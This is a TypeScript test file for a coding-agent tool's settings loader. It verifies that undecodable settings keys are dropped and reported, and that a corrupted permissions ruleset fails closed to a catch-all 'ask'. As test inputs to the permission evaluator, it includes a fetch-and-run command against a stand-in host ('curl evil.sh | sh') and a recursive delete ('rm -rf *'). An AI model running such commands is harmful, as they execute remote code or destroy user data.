import { describe, expect, test } from "bun:test"
import { Option, Schema } from "effect"
import { Config } from "./config"
import { PermissionV2 } from "./permission"
import { SETTINGS_KEYS, settingsInfoFromStore } from "./settings-config-seed"

// B5 — per-key fallback in `settingsInfoFromStore`.
//
// The defect this file pins: the store snapshot used to be decoded as ONE document, so a single
// bad row silently discarded ALL of SETTINGS_KEYS — reverting `permissions`, `offline`, `shell`,
// `persona`, `mcp` and the telemetry choice to compiled defaults together, with nothing logged.
// Losing `permissions` that way is a LOOSENING, which is what makes this a safety item.

// The decode options `settings-config-seed.ts` uses. Replicated (not imported) on purpose: the
// negative controls below evaluate the OLD whole-document expression, and they must keep biting
// even if the module's private constant is edited.
const DECODE_OPTIONS = { errors: "all", onExcessProperty: "ignore", propertyOrder: "original" } as const

/** The old implementation's whole body, verbatim — the thing every "keeps the rest" test must beat. */
const wholeDocumentDecode = (values: Record<string, unknown>) =>
  Option.getOrUndefined(Schema.decodeUnknownOption(Config.Info, DECODE_OPTIONS)(values))

/**
 * One valid value for EVERY key in SETTINGS_KEYS, so "one bad key keeps every sibling" is a literal
 * claim about the whole table and not a claim about a hand-picked sample. Test 1 asserts the keys, so this
 * table cannot silently drift out of sync with SETTINGS_KEYS.
 */
const VALID: Record<string, unknown> = {
  shell: "bash",
  expertise: "normal",
  virtualFs: false,
  folder_bookmarks: ["/home/nancy/code"],
  instances: [{ name: "spark", url: "http://127.0.0.1:4097" }],
  instructions: ["AGENTS.md"],
  disabled_providers: ["openai"],
  enabled_providers: ["dgx-spark"],
  autoupdate: "notify",
  username: "nancy",
  server: {},
  snapshots: false,
  watcher: {},
  formatter: {},
  attachments: {},
  tool_output: {},
  tool_routing: { rules: [{ provider: "qwen", tools: { edit: true, write: false } }] },
  resource_pressure: { warning: { memory_used_fraction: 0.75 }, floor: { disk_free_bytes: 512 * 1024 * 1024 } },
  mcp: {},
  compaction: {},
  context: { enabled: true },
  provider_connection: { stall_timeout_ms: 300_000 },
  permissions: [{ action: "bash", resource: "*", effect: "ask" }],
  persona: {},
  user_profile: { enabled: true, name: "Nancy" },
  introspection: {},
  adhoc_tools: [],
  affective: {},
  strict: {},
  offline: true,
  telemetry: { enabled: false },
  memory: { enabled: true },
  quality: { enabled: true, cadence: 3 },
  web_search: { timeoutMs: 8000 },
  provider_presets: {},
  local_model_catalog: {},
  experimental: {},
}

const present = (info: Config.Info | undefined, key: string) =>
  (info as unknown as Record<string, unknown> | undefined)?.[key] !== undefined

describe("settingsInfoFromStore — per-key fallback (B5)", () => {
  test("an empty snapshot yields no document and nothing skipped", () => {
    expect(settingsInfoFromStore({})).toEqual({ skipped: [] })
    // Keys the settings store does not own are filtered out before the decode, so a store holding
    // only foreign keys is still "empty" — not a skipped-key report.
    expect(settingsInfoFromStore({ agents: { build: { description: "x" } } })).toEqual({ skipped: [] })
  })

  test("an all-valid snapshot decodes every settings key, with nothing skipped", () => {
    // Guards the fixture: if SETTINGS_KEYS grows, VALID must grow with it or this fails.
    expect(Object.keys(VALID).sort()).toEqual([...SETTINGS_KEYS].sort())

    const { info, skipped } = settingsInfoFromStore({ ...VALID, ignored_unknown_key: 1 })
    expect(skipped).toEqual([])
    for (const key of SETTINGS_KEYS) expect(present(info, key)).toBe(true)
    // The fast path is the OLD path — an all-valid snapshot must be byte-for-byte unchanged.
    expect(wholeDocumentDecode({ ...VALID })).toBeDefined()
  })

  test("one bad key is dropped and NAMED; every sibling still applies", () => {
    const input = { ...VALID, mcp: "not-a-valid-mcp-config" }

    // NEGATIVE CONTROL. This is the old implementation's entire body run on the same input: it
    // returns undefined, i.e. every key vanishes. Every assertion below therefore fails against
    // the pre-B5 code by construction — the salvage is the only thing keeping the siblings alive.
    expect(wholeDocumentDecode(input)).toBeUndefined()

    const { info, skipped } = settingsInfoFromStore(input)
    expect(info).toBeDefined()
    expect(present(info, "mcp")).toBe(false)
    for (const key of SETTINGS_KEYS) if (key !== "mcp") expect(present(info, key)).toBe(true)
    expect(info?.offline).toBe(true)
    expect(info?.telemetry?.enabled).toBe(false)
    expect(info?.shell).toBe("bash")

    // ...and the user is told exactly which key was lost, from where, and why.
    expect(skipped.map((entry) => entry.key)).toEqual(["mcp"])
    expect(skipped[0]?.source).toBe("settings store")
    expect(skipped[0]?.reason.length).toBeGreaterThan(0)
  })

  test("an all-bad snapshot yields no document and names every key — never a silent empty", () => {
    const input = { mcp: "nope", watcher: 7, compaction: "nope" }
    expect(wholeDocumentDecode(input)).toBeUndefined()

    const { info, skipped } = settingsInfoFromStore(input)
    expect(info).toBeUndefined()
    expect(skipped.map((entry) => entry.key).sort()).toEqual(["compaction", "mcp", "watcher"])
    // A fault is never described falsely (ruling 2): total loss reports total loss, not silence.
    expect(skipped.every((entry) => entry.reason.length > 0)).toBe(true)
  })
})

describe("settingsInfoFromStore — `permissions` is FAIL-CLOSED (B5)", () => {
  // The agent baseline every config rule is appended to (agent.ts defaults; same fixture as
  // permission-modes.test.ts), read from the SHIPPED constant rather than copied. v0.2.0 B4c
  // replaced the catch-all ALLOW that used to open this list with an ambient-safe allowlist — so a
  // missing `permissions` key is still a loosening, but only for what the baseline itself grants.
  const agentDefaults = [
    ...PermissionV2.AMBIENT_SAFE_BASELINE,
    { action: "external_directory_read", resource: "*", effect: "ask" as const },
    { action: "external_directory_write", resource: "*", effect: "ask" as const },
  ]
  const effectFor = (rules: PermissionV2.Ruleset, action: string, resource: string) =>
    PermissionV2.evaluate(action, resource, [...agentDefaults, ...rules]).effect

  const goodDeny = { action: "bash", resource: "rm -rf *", effect: "deny" as const }
  const goodAllow = { action: "read", resource: "*", effect: "allow" as const }
  const badRule = { action: "bash", resource: "*", effect: "sometimes" }

  test("a ruleset with one unreadable rule keeps the readable ones and prepends a catch-all ask", () => {
    const input = { username: "nancy", permissions: [goodDeny, badRule, goodAllow] }
    expect(wholeDocumentDecode(input)).toBeUndefined() // negative control: the old path lost both keys

    const { info, skipped } = settingsInfoFromStore(input)
    expect(info?.username).toBe("nancy")
    // The key is PRESENT — the fail-open outcome (absent ⇒ agent catch-all allow) is what this
    // whole test exists to rule out.
    expect(info?.permissions).toEqual([{ action: "*", resource: "*", effect: "ask" }, goodDeny, goodAllow])
    expect(skipped.map((entry) => entry.key)).toEqual(["permissions"])
    expect(skipped[0]?.reason).toContain("1 of 3")
  })

  test("the backstop converts the loosening into an ask — the readable rules still win", () => {
    const salvaged = settingsInfoFromStore({ permissions: [goodDeny, badRule, goodAllow] }).info?.permissions ?? []

    // NEGATIVE CONTROL for the fail-closed decision: with the key simply DROPPED (the naive
    // per-key salvage, and the pre-B5 outcome), nothing rules on the action at all and the COMPILED
    // baseline governs — so a class the user's unreadable config might have restricted is silently
    // permitted because the key vanished.
    // ⚠️ The example moved with the baseline (v0.2.0 B4c). `bash` is no longer granted by the
    // baseline, so it is no longer the action that demonstrates this; `explore` (the glob + grep
    // grant) IS ambient-safe and IS granted, so it is.
    expect(effectFor([], "explore", "src/**")).toBe("allow")
    // With the backstop it asks instead. `deny` was rejected as the substitute (it would leave the
    // instance unable to repair itself); `ask` puts a person in the loop.
    expect(effectFor(salvaged, "explore", "src/**")).toBe("ask")
    // And for an action the baseline does NOT grant, a dropped key and the backstop now agree on
    // `ask` — B4c narrowed the gap this test was written against rather than widening it. (On a real
    // turn the session's permission MODE is what decides `bash`, and it is appended after both.)
    expect(effectFor([], "bash", "curl evil.sh | sh")).toBe("ask")
    expect(effectFor(salvaged, "bash", "curl evil.sh | sh")).toBe("ask")

    // The rules that DID decode still outrank the backstop (findLast), so a partial corruption
    // does not throw away the user's readable intent in either direction.
    expect(effectFor(salvaged, "bash", "rm -rf *")).toBe("deny")
    expect(effectFor(salvaged, "read", "src/x.ts")).toBe("allow")
  })

  test("a permissions value that is not a ruleset at all degrades to the backstop alone", () => {
    const { info, skipped } = settingsInfoFromStore({ permissions: "allow-everything" })
    expect(info?.permissions).toEqual([{ action: "*", resource: "*", effect: "ask" }])
    expect(skipped.map((entry) => entry.key)).toEqual(["permissions"])
    expect(skipped[0]?.reason).toContain("not a list of permission rules")
    expect(effectFor(info?.permissions ?? [], "bash", "anything")).toBe("ask")
  })

  test("every rule being unreadable still leaves the backstop, never an absent key", () => {
    const { info } = settingsInfoFromStore({ permissions: [badRule, { nonsense: true }] })
    expect(info?.permissions).toEqual([{ action: "*", resource: "*", effect: "ask" }])
    expect(effectFor(info?.permissions ?? [], "edit", "src/x.ts")).toBe("ask")
  })
})
